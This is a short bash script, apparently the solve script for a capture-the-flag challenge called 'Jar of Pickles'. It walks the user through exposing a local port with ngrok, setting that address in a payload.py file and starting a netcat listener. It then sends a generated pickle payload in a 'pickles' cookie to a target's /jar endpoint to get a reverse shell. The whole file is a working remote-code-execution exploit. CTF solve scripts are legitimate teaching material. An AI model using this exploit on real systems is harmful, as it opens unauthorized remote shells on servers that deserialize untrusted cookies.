#!/bin/bash

PORT=8007

if [[ $1 == "local" ]]
then
    URL='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]]
then
    URL='http://141.85.224.105:'$PORT
elif [[ $# -ne 2 ]]
then
    echo "Usage:"
    echo $0" {local,remote}"
    echo "or"
    echo $0" <ip> <port>"
    exit 1
else
    URL=$1':'$2
fi

# Jar of Pickles
echo "Step 1: Forward your 1234 port using ngrok."
echo "Use the instructions from here: https://securiumsolutions.com/blog/reverse-shell-using-tcp/"
echo "Press any key to continue if you've done this."
echo
while [ true ] ; do
    read -n 1
    if [ $? = 0 ] ; then
        break ;
    fi
done

echo "Step 2: Update the ngrok IP and PORT in \`./payload.py\` so that it could connect to it."
echo "Press any key to continue if you've done this."
echo
while [ true ] ; do
    read -n 1
    if [ $? = 0 ] ; then
        break ;
    fi
done

echo "Step 3: In a new terminal, open a new connection to your internal port: \`nc -nvl 1234\`"
echo "You might need to add the -p option if you're working inside a VM."
echo "Press any key to continue if you've done this."
echo
while [ true ] ; do
    read -n 1
    if [ $? = 0 ] ; then
        break ;
    fi
done

echo "Now I am sending the reverse shell payload, check the \`nc\` terminal..."
cookie_payload=`python3 ./payload.py`
curl "$URL"'/jar' -H "Cookie: pickles=$cookie_payload"
